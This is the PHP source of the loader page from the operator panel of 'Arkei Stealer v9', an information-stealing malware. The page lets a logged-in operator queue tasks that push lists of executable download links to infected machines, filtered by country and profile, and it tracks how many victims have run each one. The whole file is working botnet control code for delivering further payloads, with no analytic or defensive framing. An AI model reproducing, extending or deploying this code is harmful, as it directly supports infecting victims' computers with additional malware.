<?php
/*
* -------------------------------------------------------------
*								_        _ 
*					 /\        | |      (_)
*					/  \   _ __| | _____ _ 
*				   / /\ \ | '__| |/ / _ \ |
*				  / ____ \| |  |   <  __/ |
*				 /_/    \_\_|  |_|\_\___|_|
*
*
*                    Arkei Stealer v9
*                   (x) foxovsky 2018
*
* -------------------------------------------------------------
* [loader.php]
*    Loader
*/

session_start();

error_reporting(0);

require("../app/config.php");

if($_SESSION["auth"] != true)
{
	header( 'Location: http://'. $config["panel_url"] .'/'. $config["panel_folder"] .'/auth.php', true, 301 );
	exit(0);
}

$pageName = "Loader";

$userProfile = $_SESSION["profile"];

$name 		= checkParam($_POST["name"]);
$count 		= checkParam($_POST["count"]);
$country 	= checkParam($_POST["country"]);

if($userProfile == "0")
{
	$profile 	= checkParam($_POST["profile"]);
}
else
{
	$profile 	= $userProfile;
}

$task 		= checkParam($_POST["task"]);

$action 	= checkParam($_GET["action"]);
$id			= checkParam($_GET["id"]);

$database = mysqli_connect($config["db_server"], $config["db_user"], $config["db_password"], $config["db_name"]);

if($database)
{
	$name 		= mysqli_real_escape_string($database, $name);
	$count 		= mysqli_real_escape_string($database, $count);
	$country 	= mysqli_real_escape_string($database, $country);
	$profile 	= mysqli_real_escape_string($database, $profile);
	$task	 	= mysqli_real_escape_string($database, $task);
	
	if($profile == "all")
	{
		$profile = "0";
	}
	
	if($name != null & $count != null & $country != null & $profile != null & $task != null)
	{
		$database->query("INSERT INTO `tasks`(`id`, `name`, `count`, `success`, `country`, `profile`, `task`, `status`) VALUES ('','$name','$count','0','$country','$profile','$task','2')");
	}
	
	if($action == "delete")
	{
		$id = mysqli_real_escape_string($database, $id);
		
		$database->query("DELETE FROM `tasks` WHERE `id`='$id'");
	}
	
	$profiles = $database->query("SELECT * FROM `profiles` ORDER BY `id`;");
	
	if($userProfile == "0")
	{
		$tasks = $database->query("SELECT * FROM `tasks`;");
	}
	else
	{
		$tasks = $database->query("SELECT * FROM `tasks` WHERE `profile`='$userProfile';");
	}
}

require("template/header.tmpl.php");

function checkParam($param)
{
	$formatted = $param;
	$formatted = trim($formatted);
	$formatted = stripslashes($formatted);
	$formatted = htmlspecialchars($formatted);
	
	return $formatted;
}

?>
<div class="wrapper">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-12">
                        <div class="page-title-box">
                            <h4 class="page-title">Create Task</h4>
                        </div>
                    </div>
                </div>     
                <div class="row">
                    <div class="col-12">
                        <div class="card">
                            <div class="card-body">
                                <h4 class="header-title"></h4>
    
                                <form class="form-horizontal" action="" method="POST">
									
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Name</label>
                                        <div class="col-sm-10">
                                            <input class="form-control" placeholder="Task name" value="" name="name" type="text">
                                        </div>
                                    </div>
									
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Count</label>
                                        <div class="col-sm-10">
                                            <input class="form-control" placeholder="100" value="" name="count" type="text">
                                        </div>
                                    </div>
									
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Country</label>
                                        <div class="col-sm-10">
                                            <input class="form-control" placeholder="* or RU or RU,KZ or RU,KZ,US,CA" value="" name="country" type="text">
                                        </div>
                                    </div>
									
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Profile</label>
                                        <div class="col-sm-10">
                                            <select class="form-control" name="profile">
											<?
											
											if($userProfile == "0")
											{
												?>
												<option value="all">All</option>
												<?php
												
												while ($profile = $profiles->fetch_assoc())
												{
													?><option value="<? echo $profile["id"]; ?>"><? echo $profile["Name"]; ?></option><?
												}
												
												?>
												<?
											}
											else
											{
												$profile = $database->query("SELECT * FROM `profiles` WHERE `id`='$userProfile';")->fetch_array();
												?>
												<option value="<? echo $userProfile; ?>"><? echo $profile["Name"]; ?></option>
												<?
											}
											
											?>
                                            </select>
                                        </div>
                                    </div>
									
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Links</label>
                                        <div class="col-sm-10">
                                            <textarea class="form-control" name="task" placeholder="http://domain.com/file.exe;http://domain.com/file.exe;" rows="5"></textarea>
                                        </div>
                                    </div>
									
									<button type="submit" class="btn btn-primary">Create</button>
    
                                </form>
    
                            </div> <!-- end card-box -->
                        </div> <!-- end card-->
                    </div><!-- end col -->
                </div> 
            </div> <!-- end container -->

	<div class="container-fluid">
		<div class="row">
			<div class="col-12">
				<div class="page-title-box">
				
					<h4 class="page-title">Tasks</h4>
				</div>
			</div>
		</div> 
		
		<div class="row">
			<div class="col-12">
				<div class="card">
					<div class="card-body">
						<h4 class="header-title">Tasks</h4>
							<div class="table-responsive mt-3" style="overflow-x: inherit;">
								<table class="table table-hover table-centered mb-0">
									<thead>
										<tr>
											<th>ID</th>
											<th>Name</th>
											<th>Count</th>
											<th>Done</th>
											<th>Country</th>
											<th>Profile</th>
											<th>Status</th>
											<th>Actions</th>
										</tr>
									</thead>
									
									<tbody>
									<?php
									while ($task = $tasks->fetch_assoc())
									{
									
									?>
										<tr>
											<td><b>#<? echo $task["id"]; ?></b></td>
											<td><? echo $task["name"]; ?></td>
											<td><? echo $task["count"]; ?></td>
											<td><? echo $task["success"]; ?></td>
											<td><? echo $task["country"]; ?></td>
											<td><? 
												$profileID = $task["profile"];
												
												if($profileID == "0")
												{
													echo "All Profiles";
												}
												else
												{
													$profile = $database->query("SELECT * FROM `profiles` WHERE `id`='$profileID';")->fetch_array();
													echo $profile["Name"];
												}
												
												?></td>
												<td><?
												
												switch($task["status"])
												{
													case '2':
														echo "In Progress";
														break;
														
													case '1':
														echo "Done";
														break;
												}
												
												?></td>
											<td><a href="loader.php?action=delete&id=<? echo $task["id"]; ?>" >Delete</a></td>
										</tr>
										
									<?php
									}
									?>
									</tbody>
								</table>
							</div>
						</div>
					</div>
				</div>
			</div> 
		</div>
	</div>

<?php
require("template/footer.tmpl.php");

?>